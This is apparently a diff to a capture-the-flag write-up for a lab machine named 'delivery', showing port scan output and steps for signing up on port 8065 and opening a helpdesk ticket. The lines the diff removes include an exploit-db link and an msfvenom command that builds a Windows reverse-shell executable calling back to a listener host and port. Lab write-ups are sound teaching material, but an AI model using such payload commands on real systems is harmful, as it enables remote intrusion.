@@ -17,5 +17,8 @@ PORT     STATE SERVICE
 8065/tcp open  unknown
 
 Visiting the website on port 80, I note a redirect to http://helpdesk.delivery.htb/
-https://www.exploit-db.com/exploits/45169
-msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=10.10.14.31 LPORT=4444 -b "\x00" -e <encoder> -f exe -o reverse.exe
+
+Now we attempt to access port 8065 at http://10.10.10.222:8065/signup_email
+Create an account on delivery
+Open a ticket using that account email
+
